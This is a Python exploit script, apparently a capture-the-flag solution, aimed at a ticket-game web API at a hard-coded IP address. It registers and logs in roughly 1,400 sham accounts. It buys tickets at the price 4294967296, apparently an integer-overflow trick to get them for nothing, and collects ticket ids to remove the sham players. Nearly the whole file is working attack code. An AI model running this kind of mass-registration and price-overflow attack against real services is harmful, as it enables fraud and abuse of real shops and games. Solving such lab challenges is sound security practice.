import requests
import json


url = "http://117.51.147.155:5050"
s = requests.session()
stinmin = requests.session()
stinmin.get(url+"/ctf/api/login?name=tinmin&password=12345678")  #吃鸡用户登录

def register():
	u = url + "/ctf/api/register?name=tinmin{}&password=12345678"
	for i in range(1,1400):			#疯狂注册一堆托

		r = requests.get(u.format(i))
		print(r.text)

def login():
	v = url + "/ctf/api/login?name=tinmin{}&password=12345678"
	for i in range(1,1400):
		print(v.format(i))
		r = s.get(v.format(i))
		
		buy()						#买票
		get()						#拿ticket id


def buy():
	w = url + "/ctf/api/buy_ticket?ticket_price=4294967296"
	r = s.get(w)
	bill_id = json.loads(r.text)['data'][0]['bill_id']
	pay(bill_id)
	get()

def get():
	c = "http://117.51.147.155:5050/ctf/api/search_ticket"
	r = s.get(c)
	print(r.text)
	i = json.loads(r.text)['data'][0]['id']
	ticket = json.loads(r.text)['data'][0]['ticket']
	#if i != 36 and i != 80 i != 2:
	#	destroy(i,ticket)

def pay(bill_id):			#付款
	#print(bill_id)
	n = url + "/ctf/api/pay_ticket?bill_id={}".format(bill_id)
	r = s.get(n)
	print(r.text)



def destroy(user_id,ticket):	#移除
	print(user_id,ticket)
	t = url + "/ctf/api/remove_robot?id={}&ticket={}".format(user_id,ticket)
	r = stinmin.get(t)

register()
login()